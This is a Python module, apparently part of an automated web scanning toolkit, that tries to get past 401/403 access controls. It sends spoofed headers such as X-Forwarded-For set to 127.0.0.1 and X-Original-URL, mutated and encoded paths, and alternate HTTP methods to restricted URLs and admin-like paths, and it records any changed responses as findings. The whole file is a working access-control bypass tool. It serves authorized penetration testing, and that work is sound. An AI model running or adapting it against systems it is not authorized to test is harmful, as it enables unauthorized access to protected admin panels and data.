"""
Phase 2 - Module 8c: 403/401 Bypass Engine
Attempts to bypass access controls using header manipulation and path fuzzing.
"""
import asyncio
import httpx
from typing import List, Dict, Optional
from urllib.parse import urlparse


# Headers that may trick origin servers into trusting us
BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Override-URL": "/admin"},
    {"X-HTTP-Method-Override": "GET"},
    {"Content-Length": "0"},
    {"Referer": "https://localhost/admin"},
]

# Path variations that can bypass WAF / ACL rules
def get_path_bypasses(path: str) -> List[str]:
    """Generate path variants for a given restricted path."""
    p = path.rstrip("/")
    return [
        p,
        p + "/",
        p + "//",
        p + "/..",
        p + "/./",
        p.replace("/", "//"),
        "/" + p.lstrip("/").replace("/", "%2f"),
        "/" + p.lstrip("/").replace("/", "%252f"),  # Double-encoded
        p + "%20",
        p + "?",
        p + "#",
        p + "..;/",
        p + ";.json",
        "." + p,
        p.upper(),
        p + ".json",
        p + ".php",
        p.upper() + "/",
    ]

# HTTP method override attempts
HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "DEBUG", "TRACE"]


class FourOhThreeBypass:
    def __init__(self, timeout: int = 10):
        self.timeout = timeout

    async def test_url(self, url: str) -> List[Dict]:
        """Attempt to bypass a 403/401 restricted URL."""
        findings = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or "/"

        async with httpx.AsyncClient(verify=False, timeout=self.timeout, follow_redirects=False) as client:

            # ── 1. Original request to confirm 403 ──────────────────────
            try:
                base_resp = await client.get(url)
                if base_resp.status_code not in [401, 403]:
                    return []  # Not restricted, skip
            except Exception:
                return []

            # ── 2. Header manipulation bypass ──────────────────────────
            for header_set in BYPASS_HEADERS:
                try:
                    headers = {"User-Agent": "Mozilla/5.0", **header_set}
                    resp = await client.get(url, headers=headers)
                    if resp.status_code not in [401, 403, 404, 429]:
                        findings.append(self._build_finding(
                            url=url,
                            technique=f"Header: {list(header_set.keys())[0]}: {list(header_set.values())[0]}",
                            status=resp.status_code,
                            original_status=base_resp.status_code,
                            confidence=0.80,
                        ))
                except Exception:
                    pass

            # ── 3. Path fuzzing bypass ─────────────────────────────────
            for bypass_path in get_path_bypasses(path):
                try:
                    bypass_url = base + bypass_path
                    resp = await client.get(bypass_url, headers={"User-Agent": "Mozilla/5.0"})
                    if resp.status_code not in [401, 403, 404, 429]:
                        findings.append(self._build_finding(
                            url=bypass_url,
                            technique=f"Path bypass: {bypass_path}",
                            status=resp.status_code,
                            original_status=base_resp.status_code,
                            confidence=0.75,
                        ))
                except Exception:
                    pass

            # ── 4. HTTP method override ────────────────────────────────
            for method in HTTP_METHODS:
                try:
                    resp = await client.request(method, url, headers={"User-Agent": "Mozilla/5.0"})
                    if resp.status_code not in [401, 403, 404, 405, 429]:
                        findings.append(self._build_finding(
                            url=url,
                            technique=f"HTTP Method: {method}",
                            status=resp.status_code,
                            original_status=base_resp.status_code,
                            confidence=0.70,
                        ))
                except Exception:
                    pass

        return findings

    def _build_finding(self, url, technique, status, original_status, confidence) -> Dict:
        return {
            "type": "403/401 Bypass",
            "url": url,
            "technique": technique,
            "original_status": original_status,
            "bypass_status": status,
            "severity": "medium",
            "confidence": confidence,
            "evidence": f"Status changed from {original_status} → {status} with technique: {technique}",
            "suggested_next_step": "Confirm access in browser and test for sensitive data exposure",
        }

    async def scan(self, assets: List[Dict]) -> List[Dict]:
        """Scan all assets with 4xx status codes for bypass possibilities."""
        candidates = [a for a in assets if a.get("status_code") in [401, 403]]
        # Also check admin/panel paths from directory brute-force
        admin_keywords = ["admin", "panel", "dashboard", "manage", "control", "backend", "internal"]
        for asset in assets:
            url = asset.get("url", "")
            if any(kw in url.lower() for kw in admin_keywords):
                if asset not in candidates:
                    candidates.append(asset)

        sem = asyncio.Semaphore(10)
        results = []

        async def bounded_test(asset):
            async with sem:
                return await self.test_url(asset["url"])

        all_results = await asyncio.gather(*[bounded_test(a) for a in candidates])
        for r in all_results:
            results.extend(r)
        return results
